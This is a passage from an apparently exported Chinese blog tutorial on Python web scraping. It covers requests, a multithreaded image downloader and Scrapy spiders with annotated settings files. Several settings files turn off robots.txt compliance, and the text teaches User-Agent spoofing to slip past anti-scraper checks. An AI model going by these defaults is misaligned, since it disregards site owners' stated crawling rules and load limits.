Procuder(page_queue, img_queue)\n\t\t\tt.start()\n\n\t\t# 设置5个消费者线程\n\t\tfor x in range(5):\n\t\t\tt = Consumer(page_queue, img_queue)\n\t\t\tt.start()\n\n\n\tif __name__ == '__main__':\n\t\tmain()\n\n```\n\n* 多线程爬虫实战代码\n\n```python\n\timport requests\n\timport re\n\tfrom lxml import etree\n\timport threading\n\timport os\n\timport queue\n\tfrom urllib import request\n\n\t# 生产图片的url和name\n\tclass ProimgUrl(threading.Thread):\n\t\tdef __init__(self, page_queue, img_queue, headers, *args, **kwargs):\n\t\t\tsuper().__init__(*args, **kwargs)\n\t\t\tself.page_queue = page_queue\n\t\t\tself.img_queue = img_queue\n\t\t\tself.headers = headers\n\n\t\tdef run(self):\n\t\t\twhile True:\n\t\t\t\tif self.page_queue.empty():\n\t\t\t\t\tbreak\n\t\t\t\telse:\n\t\t\t\t\turl = self.page_queue.get()\n\t\t\t\t\tself.parse_page(url)\n\n\t\tdef parse_page(self, url):\n\t\t\timg_get = requests.get(url=url, headers=self.headers).text\n\t\t\ttree = etree.HTML(img_get)\n\t\t\timg_it = tree.xpath('//div[@class=\"page-content text-center\"]//a')\n\t\t\tfor it in img_it:\n\t\t\t\timg_url = it.xpath('./img[@class!=\"gif\"]/@data-original')[0]\n\t\t\t\talt = it.xpath('./img/@alt')[0]\n\t\t\t\talt = re.sub(r'[\\?？.!！，。\\/\\*]', '', alt)\n\t\t\t\t# 利用splitext截取图片的后缀名\n\t\t\t\tsuffix = os.path.splitext(img_url)[1]\n\t\t\t\timg_name = alt + suffix\n\t\t\t\tself.img_queue.put((img_url, img_name))\n\n\n\t# 获取图片并储存\n\tclass ConimgName(threading.Thread):\n\t\tdef __init__(self, page_queue, img_queue, headers, *args, **kwargs):\n\t\t\tsuper().__init__(*args, **kwargs)\n\t\t\tself.page_queue = page_queue\n\t\t\tself.img_queue = img_queue\n\t\t\tself.headers = headers\n\n\t\tdef run(self):\n\t\t\twhile True:\n\t\t\t\tif self.img_queue.empty() and self.page_queue.empty():\n\t\t\t\t\tbreak\n\t\t\t\telse:\n\t\t\t\t\timg_url, img_name = self.img_queue.get()\n\t\t\t\t\t# 用urlli包下的request.urlretrieve模块，可以更方便的获取和存储图片\n\t\t\t\t\trequest.urlretrieve(img_url, './smile/'+img_name)\n\t\t\t\t\tprint(img_name + ' 下载成功...')\n\n\tdef main():\n\t\tif not os.path.exists('./smile'):\n\t\t\tos.mkdir('./smile')\n\t\theaders = {\n\t\t\t'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '\n\t\t\t\t\t\t  'Chrome/80.0.3987.149 Safari/537.36 '\n\t\t}\n\t\tpage_queue = queue.Queue(100)\n\t\timg_queue = queue.Queue(1000)\n\n\t\tfor x in range(1, 10):\n\t\t\turl = 'https://www.doutula.com/photo/list/?page=' + str(x)\n\t\t\tpage_queue.put(url)\n\n\t\tfor i in range(5):\n\t\t\tt = ProimgUrl(page_queue, img_queue, headers)\n\t\t\tt.start()\n\n\t\tfor i in range(5):\n\t\t\tt = ConimgName(page_queue, img_queue, headers)\n\t\t\tt.start()\n\n\n\tif __name__ == '__main__':\n\t\tmain()\n\n```\n\n* 多线程爬虫的一些坑：多线程爬虫爬取的内容是无序的\n\n\n\n# 爬虫第五天\n\n## scrapy爬虫框架\n\n[关于xpath选择器selector的网址](https://zhuanlan.zhihu.com/p/25443389)\n\n\n\n![scrapy框架示意图](https://img-blog.csdnimg.cn/20200328091921480.png)\n\n1. 创建项目\n\n   ​\tscrapy startproject #^%#^(项目名字)\n\n   \n\n2. 创建爬虫\n\n   ​\tscrapy genspider 爬虫名字 网络域名\n\n   注意：\n\n    * 爬虫名字不要和项目名字一样\n    * 网站域名是允许爬虫采集的域名\n      - baidu.com\n\n![创建项目与配置环境后各部分组件](https://img-blog.csdn.net/20180704211604860?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMzNDcyNzY1/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)\n\nitem文件是存储数据的\n\n* 在setting文件（程序启动被首先检查的文件）\n\n* BOT_NAME = 爬虫的名字\n\n* ROBOTSTXT_OBEY = 网络君子协议君子协议（不遵守）， 布尔\n\n* CONCURRENT_REQUESTS = 爬虫的并发量\n\n* DOWOLOAD_DELAY = 下载延迟，一般是1.5或2，小项目不用管\n\n* COOKLES_ENABLED = cookiede的使用，布尔\n\n* DEFAULT_REQUEST_HEADERS = 默认请求头\n\n* ITEM_PIPELINES = 管道文件\n\n  \n\n  ### setting文件详解\n\n  ```python\n  # -*- coding: utf-8 -*-\n   \n  # Scrapy settings for TestSpider project\n  #\n  # For simplicity, this file contains only settings considered important or\n  # commonly used. You can find more settings consulting the documentation:\n  #\n  #     https://doc.scrapy.org/en/latest/topics/settings.html\n  #     https://doc.scrapy.org/en/latest/topics/downloader-middleware.html\n  #     https://doc.scrapy.org/en/latest/topics/spider-middleware.html\n   \n  BOT_NAME = 'TestSpider'\n   \n  SPIDER_MODULES = ['TestSpider.spiders']\n  NEWSPIDER_MODULE = 'TestSpider.spiders'\n   \n   \n  # Crawl responsibly by identifying yourself (and your website) on the user-agent\n  #USER_AGENT = 'TestSpider (+http://www.yourdomain.com)'\n   \n  USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0'\n   \n  # Obey robots.txt rules\n  # Scrapy框架默认遵守 robots.txt 协议规则，robots规定了一个网站中，哪些地址可以请求，哪些地址不能请求。\n  # 默认是True，设置为False不遵守这个协议。\n  ROBOTSTXT_OBEY = False\n   \n   \n  # Configure maximum concurrent requests performed by Scrapy (default: 16)\n  # 配置scrapy的请求连接数，默认会同时并发16个请求。\n  # CONCURRENT_REQUESTS = 10\n   \n  # Configure a delay for requests for the same website (default: 0)\n  # See https://doc.scrapy.org/en/latest/topics/settings.html#download-delay\n  # See also autothrottle settings and docs\n   \n  # 下载延时，请求和请求之间的间隔，降低爬取速度，default: 0\n  # DOWNLOAD_DELAY = 3\n   \n   \n  # CONCURRENT_REQUESTS_PER_DOMAIN：针对网站(主域名)设置的最大请求并发数。\n  # CONCURRENT_REQUESTS_PER_IP：某一个IP的最大请求并发数。\n  # The download delay setting will honor only one of:\n  # CONCURRENT_REQUESTS_PER_DOMAIN = 16\n  # CONCURRENT_REQUESTS_PER_IP = 16\n   \n   \n  # Disable cookies (enabled by default)\n  # 是否启用Cookie的配置，默认是可以使用Cookie的。主要是针对一些网站是禁用Cookie的。\n  # COOKIES_ENABLED = False\n   \n  # Disable Telnet Console (enabled by default)\n  #TELNETCONSOLE_ENABLED = False\n   \n   \n  # Override the default request headers:\n   \n  # 配置默认的请求头Headers.\n  # DEFAULT_REQUEST_HEADERS = {\n  #   'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n  #   'Accept-Language': 'en',\n  # }\n   \n   \n  # Enable or disable spider middlewares\n  # See https://doc.scrapy.org/en/latest/topics/spider-middleware.html\n   \n  # 配置自定义爬虫中间件，scrapy也默认启用了一些爬虫中间件，可以在这个配置中关闭。\n  # SPIDER_MIDDLEWARES = {\n  #    'TestSpider.middlewares.TestspiderSpiderMiddleware': 543,\n  # }\n   \n   \n  # 下载中间件，配置自定义的中间件或者取消Scrapy默认启用的中间件。\n  # Enable or disable downloader middlewares\n  # See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html\n  # DOWNLOADER_MIDDLEWARES = {\n  #    'TestSpider.middlewares.TestspiderDownloaderMiddleware': 543,\n  # }\n   \n   \n  # Enable or disable extensions\n  # See https://doc.scrapy.org/en/latest/topics/extensions.html\n  # EXTENSIONS = {\n  #    'scrapy.extensions.telnet.TelnetConsole': None,\n  # }\n   \n   \n  # Configure item pipelines\n  # See https://doc.scrapy.org/en/latest/topics/item-pipeline.html\n   \n  # 配置自定义的PIPELINES，或者取消PIPELINES默认启用的中间件。\n  # ITEM_PIPELINES = {\n  #    'TestSpider.pipelines.TestspiderPipeline': 300,\n  # }\n   \n   \n  # 限速配置\n  # Enable and configure the AutoThrottle extension (disabled by default)\n  # See https://doc.scrapy.org/en/latest/topics/autothrottle.html\n   \n  # 是否开启自动限速\n  # AUTOTHROTTLE_ENABLED = True\n   \n   \n  # The initial download delay\n  # 配置初始url的下载延时\n  # AUTOTHROTTLE_START_DELAY = 5\n   \n   \n  # The maximum download delay to be set in case of high latencies\n  # 配置最大请求时间\n  # AUTOTHROTTLE_MAX_DELAY = 60\n   \n   \n  # 配置请求和请求之间的下载间隔，单位是秒\n  # The average number of requests Scrapy should be sending in parallel to\n  # each remote server\n  # AUTOTHROTTLE_TARGET_CONCURRENCY = 1.0\n   \n   \n  # Enable showing throttling stats for every response received:\n  # AUTOTHROTTLE_DEBUG = False\n   \n   \n  # 关于Http缓存的配置，默认是不启用。\n  # 对于同一个页面的请求进行数据的缓存，如果后续还有相同的请求，直接从缓存中进行获取。\n  # Enable and configure HTTP caching (disabled by default)\n  # See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html#httpcache-middleware-settings\n  #HTTPCACHE_ENABLED = True\n  #HTTPCACHE_EXPIRATION_SECS = 0\n  #HTTPCACHE_DIR = 'httpcache'\n  #HTTPCACHE_IGNORE_HTTP_CODES = []\n  #HTTPCACHE_STORAGE = 'scrapy.extensions.httpcache.FilesystemCacheStorage'\n  ```\n\n  ### scrapy爬虫之spider类（示例 一：爬取糗事百科）\n\n  - 创建爬虫项目：scrapy startproject xiushi\n  - 创建爬虫文件:   scrapy genSpider xiushiSpider  qiushidabaike.com\n\n  #### item 部分\n\n  ```python\n  # -*- coding: utf-8 -*-\n  \n  # Define here the models for your scraped items\n  #\n  # See documentation in:\n  # https://doc.scrapy.org/en/latest/topics/items.html\n  \n  import scrapy\n  \n  \n  class XiushiItem(scrapy.Item):\n      # define the fields for your item here like:\n      # name = scrapy.Field()\n      title = scrapy.Field()\n      text = scrapy.Field()\n  \n  ```\n\n  #### setting 部分\n\n  ```python\n  # -*- coding: utf-8 -*-\n  \n  # Scrapy settings for xiushi project\n  #\n  # For simplicity, this file contains only settings considered important or\n  # commonly used. You can find more settings consulting the documentation:\n  #\n  #     https://doc.scrapy.org/en/latest/topics/settings.html\n  #     https://doc.scrapy.org/en/latest/topics/downloader-middleware.html\n  #     https://doc.scrapy.org/en/latest/topics/spider-middleware.html\n  \n  BOT_NAME = 'xiushi'\n  \n  SPIDER_MODULES = ['xiushi.spiders']\n  NEWSPIDER_MODULE = 'xiushi.spiders'\n  \n  # Crawl responsibly by identifying yourself (and your website) on the user-agent\n  # USER_AGENT = 'xiushi (+http://www.yourdomain.com)'\n  \n  # Obey robots.txt rules\n  ROBOTSTXT_OBEY = False\n  \n  # Configure maximum concurrent requests performed by Scrapy (default: 16)\n  # CONCURRENT_REQUESTS = 32\n  \n  # Configure a delay for requests for the same website (default: 0)\n  # See https://doc.scrapy.org/en/latest/topics/settings.html#download-delay\n  # See also autothrottle settings and docs\n  DOWNLOAD_DELAY = 1\n  # The download delay setting will honor only one of:\n  # CONCURRENT_REQUESTS_PER_DOMAIN = 16\n  # CONCURRENT_REQUESTS_PER_IP = 16\n  \n  # Disable cookies (enabled by default)\n  # COOKIES_ENABLED = False\n  \n  # Disable Telnet Console (enabled by default)\n  # TELNETCONSOLE_ENABLED = False\n  \n  # Override the default request headers:\n  DEFAULT_REQUEST_HEADERS = {\n      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n      'Accept-Language': 'en',\n      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '\n                    'Chrome/80.0.3987.163 Safari/537.36 '\n  }\n  \n  # Enable or disable spider middlewares\n  # See https://doc.scrapy.org/en/latest/topics/spider-middleware.html\n  # SPIDER_MIDDLEWARES = {\n  #    'xiushi.middlewares.XiushiSpiderMiddleware': 543,\n  # }\n  \n  # Enable or disable downloader middlewares\n  # See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html\n  # DOWNLOADER_MIDDLEWARES = {\n  #    'xiushi.middlewares.XiushiDownloaderMiddleware': 543,\n  # }\n  \n  # Enable or disable extensions\n  # See https://doc.scrapy.org/en/latest/topics/extensions.html\n  # EXTENSIONS = {\n  #    'scrapy.extensions.telnet.TelnetConsole': None,\n  # }\n  \n  # Configure item pipelines\n  # See https://doc.scrapy.org/en/latest/topics/item-pipeline.html\n  ITEM_PIPELINES = {\n     'xiushi.pipelines.XiushiPipeline': 300,\n  }\n  \n  # Enable and configure the AutoThrottle extension (disabled by default)\n  # See https://doc.scrapy.org/en/latest/topics/autothrottle.html\n  # AUTOTHROTTLE_ENABLED = True\n  # The initial download delay\n  # AUTOTHROTTLE_START_DELAY = 5\n  # The maximum download delay to be set in case of high latencies\n  # AUTOTHROTTLE_MAX_DELAY = 60\n  # The average number of requests Scrapy should be sending in parallel to\n  # each remote server\n  # AUTOTHROTTLE_TARGET_CONCURRENCY = 1.0\n  # Enable showing throttling stats for every response received:\n  # AUTOTHROTTLE_DEBUG = False\n  \n  # Enable and configure HTTP caching (disabled by default)\n  # See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html#httpcache-middleware-settings\n  # HTTPCACHE_ENABLED = True\n  # HTTPCACHE_EXPIRATION_SECS = 0\n  # HTTPCACHE_DIR = 'httpcache'\n  # HTTPCACHE_IGNORE_HTTP_CODES = []\n  # HTTPCACHE_STORAGE = 'scrapy.extensions.httpcache.FilesystemCacheStorage'\n  \n  ```\n\n  #### spider 部分\n\n  ```python\n  # -*- coding: utf-8 -*-\n  import scrapy\n  from xiushi.items import XiushiItem\n  \n  \n  class XiushispiderSpider(scrapy.Spider):\n      name = 'xiushiSpider'\n      allowed_domains = ['qiushidabaike.com']\n      start_urls = ['http://qiushidabaike.com/index_1.html']\n      base_domain = 'http://qiushidabaike.com'\n  \n      def parse(self, response):\n          duanzi = response.xpath('//div[@class=\"main-left fl\"]//dl')\n          for it in duanzi:\n              title = it.xpath('./dt/span/a/text()').get().strip()\n              text = it.xpath('./dd[@class=\"content\"]//text()').getall()\n              text = \"\".join(text).strip()\n              item = XiushiItem(title=title, text=text)\n              yield item\n          # 进行翻页操作\n          next_url = response.xpath('//div[@class=\"page\"]//a[@class=\"next\"]/@href').get()\n          if not next_url:\n              return\n          else:\n              yield scrapy.Request(self.base_domain+next_url, callback=self.parse)\n  \n  ```\n\n  #### pipelines 部分\n\n  ```python\n  # -*- coding: utf-8 -*-\n  \n  # Define your item pipelines here\n  #\n  # Don't forget to add your pipeline to the ITEM_PIPELINES setting\n  # See: https://doc.scrapy.org/en/latest/topics/item-pipeline.html\n  \"\"\"\n  # 第一种方法，没进行json优化，但是看起来简单易操作\n  import json\n  \n  \n  class XiushiPipeline(object):\n      def __init__(self):\n          self.fp = open('duanzi.json', 'w', encoding='utf-8')\n  \n      def open_spider(self, spider):\n          print('爬虫开始了...')\n  \n      def process_item(self, item, spider):\n          item_json = json.dumps(dict(item),  ensure_ascii=False)\n          self.fp.write(item_json+'\\n')\n          return item\n  \n      def close_spider(self, spider):\n          self.fp.close()\n          print(\"爬虫结束了...\")\n  \"\"\"\n  # 方案二，json优化，结果是每个字典存储在列表中\n  #        好处是满足json规则，坏处是数据量较大时比较耗内存\n  # ''' 自我感觉这种方法不咋地 '''\n  # from scrapy.exporters import JsonItemExporter\n  #\n  #\n  # class XiushiPipeline(object):\n  #     def __init__(self):\n  #         # 注意此时以二进制形式写入\n  #         self.fp = open('duanzi.json', 'wb')\n  #         self.exporter = JsonItemExporter(self.fp, ensure_ascii=False, encoding='utf-8')\n  #         self.exporter.start_exporting()\n  #\n  #     def open_spider(self, spider):\n  #         print('爬虫开始了...')\n  #\n  #     def process_item(self, item, spider):\n  #         self.exporter.export_item(item)\n  #         return item\n  #\n  #     def close_spider(self, spider):\n  #         self.exporter.finish_exporting()\n  #         self.fp.close()\n  #         print(\"爬虫结束了...\")\n  \n  '''方案三'''\n  from scrapy.exporters import JsonLinesItemExporter\n  \n  \n  class XiushiPipeline(object):\n      def __init__(self):\n          # 注意此时以二进制形式写入\n          self.fp = open('duanzi.json', 'wb')\n          self.exporter = JsonLinesItemExporter(self.fp, ensure_ascii=False, encoding='utf-8')\n  \n      def open_spider(self, spider):\n          print('爬虫开始了...')\n  \n      def process_item(self, item, spider):\n          self.exporter.export_item(item)\n          return item\n  \n      def close_spider(self, spider):\n          self.fp.close()\n          print(\"爬虫结束了...\")\n  \n  ```\n\n  * 可以在总文件中创建.py文件，代替爬虫开始命令 scrapy crawl xiushiSpider (注意应在爬虫目录下执行该命令)\n\n```python\nfrom scrapy import cmdline\n\ncmdline.execute(\"scrapy crawl xiushiSpider\".split())\n# cmdline.execute([\"scrapy\", 'crawl', 'xiushiSpider'])\n```\n\n# 爬虫第六天\n\n### scrapy 框架之spider类（示例二.爬取优美散文）\n\n- item部分\n\n```python\n# -*- coding: utf-8 -*-\n\n# Define here the models for your scraped items\n#\n# See documentation in:\n# https://doc.scrapy.org/en/latest/topics/items.html\n\nimport scrapy\n\n\nclass ProseItem(scrapy.Item):\n    # define the fields for your item here like:\n    # name = scrapy.Field()\n    title = scrapy.Field()\n    text = scrapy.Field()\n\n```\n\n\n\n- settings部分\n\n```python\n# -*- coding: utf-8 -*-\n\n# Scrapy settings for prose project\n#\n# For simplicity, this file contains only settings considered important or\n# commonly used. You can find more settings consulting the documentation:\n#\n#     https://doc.scrapy.org/en/latest/topics/settings.html\n#     https://doc.scrapy.org/en/latest/topics/downloader-middleware.html\n#     https://doc.scrapy.org/en/latest/topics/spider-middleware.html\n\nBOT_NAME = 'prose'\n\nSPIDER_MODULES = ['prose.spiders']\nNEWSPIDER_MODULE = 'prose.spiders'\n\n# Crawl responsibly by identifying yourself (and your website) on the user-agent\n# USER_AGENT = 'prose (+http://www.yourdomain.com)'\n\n# Obey robots.txt rules\nROBOTSTXT_OBEY = False\n\n# Configure maximum concurrent requests performed by Scrapy (default: 16)\n# CONCURRENT_REQUESTS = 32\n\n# Configure a delay for requests for the same website (default: 0)\n# See https://doc.scrapy.org/en/latest/topics/settings.html#download-delay\n# See also autothrottle settings and docs\nDOWNLOAD_DELAY = 1\n# The download delay setting will honor only one of:\n# CONCURRENT_REQUESTS_PER_DOMAIN = 16\n# CONCURRENT_REQUESTS_PER_IP = 16\n\n# Disable cookies (enabled by default)\n# COOKIES_ENABLED = False\n\n# Disable Telnet Console (enabled by default)\n# TELNETCONSOLE_ENABLED = False\n\n# Override the default request headers:\nDEFAULT_REQUEST_HEADERS = {\n    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n    'Accept-Language': 'en',\n    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '\n                  'Chrome/80.0.3987.163 Safari/537.36 '\n}\n\n# Enable or disable spider middlewares\n# See https://doc.scrapy.org/en/latest/topics/spider-middleware.html\n# SPIDER_MIDDLEWARES = {\n#    'prose.middlewares.ProseSpiderMiddleware': 543,\n# }\n\n# Enable or disable downloader middlewares\n# See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html\n# DOWNLOADER_MIDDLEWARES = {\n#    'prose.middlewares.ProseDownloaderMiddleware': 543,\n# }\n\n# Enable or disable extensions\n# See https://doc.scrapy.org/en/latest/topics/extensions.html\n# EXTENSIONS = {\n#    'scrapy.extensions.telnet.TelnetConsole': None,\n# }\n\n# Configure item pipelines\n# See https://doc.scrapy.org/en/latest/topics/item-pipeline.html\nITEM_PIPELINES = {\n   'prose.pipelines.ProsePipeline': 300,\n}\n\n# Enable and configure the AutoThrottle extension (disabled by default)\n# See https://doc.scrapy.org/en/latest/topics/autothrottle.html\n# AUTOTHROTTLE_ENABLED = True\n# The initial download delay\n# AUTOTHROTTLE_START_DELAY = 5\n# The maximum download delay to be set in case of high latencies\n# AUTOTHROTTLE_MAX_DELAY = 60\n# The average number of requests Scrapy should be sending in parallel to\n# each remote server\n# AUTOTHROTTLE_TARGET_CONCURRENCY = 1.0\n# Enable showing throttling stats for every response received:\n# AUTOTHROTTLE_DEBUG = False\n\n# Enable and configure HTTP caching (disabled by default)\n# See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html#httpcache-middleware-settings\n# HTTPCACHE_ENABLED = True\n# HTTPCACHE_EXPIRATION_SECS = 0\n# HTTPCACHE_DIR = 'httpcache'\n# HTTPCACHE_IGNORE_HTTP_CODES = []\n# HTTPCACHE_STORAGE = 'scrapy.extensions.httpcache.FilesystemCacheStorage'\n\n```\n\n- proseSpider部分\n\n```python\n# -*- coding: utf-8 -*-\nimport scrapy\nfrom prose.items import ProseItem\n\n\nclass ProsespiderSpider(scrapy.Spider):\n    name = 'proseSpider'\n    allowed_domains = ['duwenzhang.com']\n    start_urls = ['http://www.duwenzhang.com/wenzhang/shenghuosuibi/']\n    base_url = 'http://www.duwenzhang.com/wenzhang/shenghuosuibi/'\n\n    def parse(self, response):\n        # xpath 选择不含有某一属性的标签\n        url_list = response.xpath('//center//tr[2]//td[(@valign) and not(@height)]/table')\n        for it in url_list:\n            title = it.xpath('.//tr[2]//td[@height=\"26\"]/b/a/text()').getall()\n            text = it.xpath('.//tr[4]/td[@style=\"padding-left:3px\"]/text()').getall()\n            text = \"\".join(text).strip()\n            item = ProseItem(title=title, text=text)\n            yield item\n        # //a[contains(text(), \"百度搜索\")]  【可以部分检索】\n        # //a[text()=\"文字内容\"] 【需要填全】 xpath定位指定文本标签\n        next_url = response.xpath('//tr//a[text()=\"下一页\"]/@href').get()\n        if not next_url:\n            return\n        else:\n            yield scrapy.Request(self.base_url+next_url, callback=self.parse)\n\n\n```\n\n\n\n- piplines 部分\n\n```python\n# -*- coding: utf-8 -*-\n\n# Define your item pipelines here\n#\n# Don't forget to add your pipeline to the ITEM_PIPELINES setting\n# See: https://doc.scrapy.org/en/latest/topics/item-pipeline.html\n\nimport json\nfrom scrapy.exporters import JsonLinesItemExporter\n\n\nclass ProsePipeline(object):\n    def __init__(self):\n        self.fp = open('prose.json', 'wb')\n        self.exporter = JsonLinesItemExporter(self.fp, ensure_ascii=False,\n                                              encoding='utf-8')\n\n    def open_spider(self, spider):\n        print('爬虫开始了...')\n\n    def process_item(self, item, spider):\n        self.exporter.export_item(item)\n        return item\n\n    def close_spider(self, spider):\n        self.fp.close()\n        print('爬虫结束了....')\n```\n\n\n\n","source":"_posts/spider.md","raw":"---\ntitle: python爬虫技术\ndate: 2020-09-14 14:06\nswiper: false # 将改文章放入轮播图中\nswiperImg: '' # 该文章在轮播图中的图片，可以是本地目录下图片也可以是http://xxx图片\nimg: 'http://cdn.mxrblog.cn/ct_2.jpg' # 该文章图片，可以是本地目录下图片也可以是http://xxx图片\ncategories: python\ntags: [python, 爬虫]   # 可以是数组\ntop: false\n---\n\n# 爬虫第一天\n\n- urllib太过古老，因此不加以深入学习\n\n### requests\nrequests模块：python中原生的一款基于网络请求的模块，功能强大，简单便捷，效率高。\n作用：模拟浏览器发送请求。\n\n如何使用：（requests模块的编码流程）\n    -指定url\n    -发起请求（get或post）\n    -获取响应数据\n    -持久化存储（数据库或本地存储）\n\n环境安装：\n    -pip或pycharm安装\n    -anaconda自带（方便已装）\n    \n<!--more-->\n\n### **实战编码：**\n\n    - 需求：爬取拉勾网首页的数据\n        示例：\n\n```python\nimport requests\n\nif __name__ == '__main__':\n    #step 1:指定url\n    url = \"https://www.lagou.com/jobs/6889986.html?show=96e52fa1d2134ad483eac5662bcc9fc6\"\n\n    #step_2:发起请求\n    #get会返回一个响应对象\n    response = requests.get(url=url)\n\n    #step_3:获取相应数据(.text返回的是字符串形式的响应数据)\n    page_text = response.text\n    print(page_text)\n\n    #step_4:持久化存储\n    with open('./lagou.html', 'w', encoding = 'utf-8') as fp:\n        fp.write(page_text)\n    print('爬取数据结束')\n```\n- 以上代码极有可能会被网站捕获，被识别出为爬虫，所以需要实施反爬虫策略\n\n- 示例： \n  UA:User-Agent (请求载体的身份标识)\n  UA检测：门户网站的服务器会检测对应的载体身份标识，如果检测到请求的载体身份标识为某一款浏览器，\n  说明该请求是一个正常的请求。但是，如果监测到请求的载体身份标识不是基于某一款浏览器的，则表示\n  该请求为不正常的请求（爬虫），则服务器端就很有可能拒绝这次请求。\n  UA伪装:将对应的请求载体身份标识伪装成一款浏览器\n\n```python\nimport requests\n\nif __name__ == '__main__':\n    # UA伪装：将对应的User-Agent封装到一个字典中\n    headers = {\n        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'\n    }\n\n    url = 'https://www.sogou.com/web?'\n\n    #处理url携带的参数：封装到字典中（参数为问号后面的）\n    kw = input('enter a word:')\n    param = {\n        'query': kw\n    }\n\n    # 需求的响应返回的是一个对象，对象应实例化\n    response = requests.get(url=url, params=param, headers=headers)\n\n    # 确认相应数据是txt类型的\n    page_text = response.text\n    fileName = kw+'.html'\n    with open(fileName, 'w', encoding='utf-8') as fp:\n        fp.write(page_text)\n    print('保存成功。。。')\n\n```\n\n# 爬虫第二天\n\n### 有关于ajax\n#### 爬取百度翻译的内容\n\n```python\nimport requests\nimport json\n\nif __name__ == '__main__':\n    #获取url\n    post_url = 'https://fanyi.baidu.com/sug'\n    #进行UA伪装\n    headers = {\n        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'\n    }\n    #post请求的参数处理（同get请求一致）\n    word = input('输入你想翻译的东西:')\n    data = {\n        'kw': word\n    }\n    #发送请求并生成响应\n    response = requests.post(url=post_url, data=data, headers=headers)\n    #获取响应数据:\n    #json()方法返回的是obj （如果确认响应数据是json类型的）\n    dic_obj = response.json()\n\n    #持久化存储\n    filename = word+'.json'\n    with open(filename, 'w', encoding='utf-8') as fp:\n        json.dump(dic_obj, fp=fp, ensure_ascii=False)\n\n    #将jaon格式转化成dict格式\n    with open(filename, 'r', encoding='utf-8') as fp:\n        great = json.load(fp)\n\n    #将字典格式化输出(此字典中存在字典与列表的嵌套现象)\n    for k, v in great.items():\n        if type(v) == list:\n            for i in v:\n                print(i)\n        else:\n            print(k)\n            print(v)\n\n    print('end...')\n\n```\n\n### 爬取豆瓣电影信息\n\n```python\n##此处代码示例为失败的例子，未考虑到由ajax得到的页面依旧采用了ajax\n\nimport requests\nimport json\n\nif __name__ == '__main__':\n    url = 'https://movie.douban.com/j/chart/top_list'\n    param = {\n        'type': ' 24',\n        'interval_id': ' 100:90',\n        'action': '',\n        'start': ' 1',\n        'limit': ' 20',\n    }\n    headers = {\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'\n    }\n\n    response = requests.get(url=url, params=param, headers=headers)\n\n    list_data = response.json()\n\n    with open('./douban.json', 'w', encoding='utf-8') as fp:\n        json.dump(list_data, fp, ensure_ascii=False)\n\n    with open('./douban.json', 'r', encoding='utf-8') as fp:\n        great = json.load(fp)\n\n    print(great)\n```\n# 爬虫学习第三天\n### 爬取国家药监总局部分信息\n\n```python\nimport requests\nimport json\n\nif __name__ == '__main__':\n    url = 'http://125.35.6.84:81/xk/itownet/portalAction.do?method=getXkzsList'\n    url_2 = 'http://125.35.6.84:81/xk/itownet/portalAction.do?method=getXkzsById'\n    headers = {\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'\n    }\n    #爬取的页数\n    page_ = input(\"请输入您想爬取的信息页数：\")\n    for page in range(1, int(page_)+1):\n        data = {\n            'on': 'true',\n            'page': page,\n            'pageSize': '15',\n            'productName': '',\n            'conditionType': '1',\n            'applyname': '',\n            'applysn': '',\n        }\n        #id_list have many ids\n        id_list = []\n        message = []\n\n        json_list = requests.post(url=url, data=data, headers=headers).json()\n        #id_a is a dict\n        for id_a in json_list[\"list\"]:\n            id_list.append(id_a[\"ID\"])\n            #id_b是id号\n        for id_b in id_list:\n                data_2 = {\n                    \"id\": str(id_b)\n                }\n                detail_message = requests.post(url=url_2, data=data_2, headers=headers).json()\n                print(detail_message)\n                message.append(detail_message)\n    with open('./药物信息.json', 'w', encoding='utf-8') as fp:\n        json.dump(message, fp, ensure_ascii=False)\n    print('end...')\n\n'''此代码爬取时间可能有些长，也有可能会出现Timeouterror错误，多试几次可能就可以了'''\n'''出现这种情况的原因是对方服务器拒绝请求（反爬虫），，，后续继续学习反反爬虫技术'''\n```\n\n### 数据解析概述\n\n- 聚焦爬虫：爬取页面中指定的页面内容\n      -编码流程\n          1、指定url\n          2、发起请求\n          3、获取相应数据\n          4、持久化存储\n          \n  -数据解析分类：\n          -正则\n          -bs4\n          -xpath\n          \n  -数据解析原理概述\n          -解析的局部的文本内容都会在标签之间或者标签对应的属性中进行存储\n          -1、进行指定标签的定位\n          -2、标签或者标签对应属性中存储的数据值进行提取（解析）\n\n### 图片的爬取代码\n\n```python\nimport requests\n#此处url为图片地址，而非链接【地址比链接短】\nurl = 'https://tse4-mm.cn.bing.net/th/id/OIP.vLPcBX_5hWArkIbn_PqvYgHaGL?w=233&h=195&c=7&o=5&dpr=1.25&pid=1.7'\nheaders = {\n        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 